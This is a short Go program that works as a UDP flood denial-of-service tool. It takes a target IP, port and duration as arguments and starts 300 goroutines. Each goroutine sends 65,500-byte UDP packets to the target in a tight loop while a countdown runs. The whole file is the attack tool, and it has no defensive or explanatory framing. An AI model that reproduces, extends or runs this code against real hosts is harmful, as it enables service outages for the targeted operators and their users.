package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"time"
)

// DEFINE THREAD COUNT
const THREADS = 300

func attack(ip string, port int, duration int) {
	// DEFINE PACKETS BYTES 65535
	bytes := make([]byte, 65500)
	startTime := time.Now()
	endTime := startTime.Add(time.Duration(duration) * time.Second)
	for time.Now().Before(endTime) {
		conn, _ := net.Dial("udp", fmt.Sprintf("%s:%d", ip, port))
		conn.Write(bytes)
		conn.Close()
		time.Sleep(1 * time.Millisecond)
	}
}

func countdown(remainingTime int) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	for i := remainingTime; i > 0; i-- {
		fmt.Printf("\rREMAINING TIME(s): %d", i)
		<-ticker.C
	}
	fmt.Print("\rTHREAD ENDS   \n")
}

func main() {
	var ip string
	var port int
	var attackDuration int

	if len(os.Args) < 4 {
		fmt.Println("./Gofuck <IP> <PORT> <ATTACK DURATION>")
		os.Exit(1)
	}

	ip = os.Args[1]
	port, _ = strconv.Atoi(os.Args[2])
	attackDuration, _ = strconv.Atoi(os.Args[3])

	go countdown(attackDuration)

	for i := 0; i < THREADS; i++ {
		go attack(ip, port, attackDuration)
	}
	time.Sleep(time.Second * time.Duration(attackDuration))
}
